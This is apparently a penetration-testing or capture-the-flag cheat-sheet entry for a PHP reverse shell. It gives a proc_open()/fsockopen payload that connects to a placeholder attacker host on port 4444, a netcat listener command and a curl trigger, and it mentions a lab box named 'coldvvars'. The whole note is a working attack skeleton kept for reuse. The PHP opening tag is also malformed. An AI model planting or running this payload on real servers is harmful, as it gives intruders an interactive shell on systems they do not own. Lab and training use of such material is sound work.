# PHP `proc_open()` Reverse Shell

PHP reverse shell variant using `proc_open()` and a TCP socket. Useful when a short `exec()` one-liner is not enough or when you want stdin/stdout/stderr wired explicitly.

Used on: **coldvvars**

## Payload Skeleton

```php
<php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(
  0 => $sock,
  1 => $sock,
  2 => $sock
), $pipes);
>
```

## Listener And Trigger

```bash
nc -lvpn 4444
curl http://$TARGET/dev/rev.php
```

## Notes

- Keep the writeup copy intact when the original contains a longer version of this payload.
- If `ATTACKER_IP` is hardcoded, use a placeholder in reusable notes unless the captured value matters for reproducing a lab session.

